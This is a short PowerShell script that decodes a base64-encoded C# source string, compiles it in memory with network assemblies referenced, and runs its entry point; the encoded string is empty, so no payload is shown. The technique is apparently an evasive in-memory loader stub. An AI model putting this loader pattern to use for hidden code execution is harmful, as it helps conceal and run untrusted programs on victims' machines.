function Invoke-Run() {
    $encodedSource = ''
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.Http.dll") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
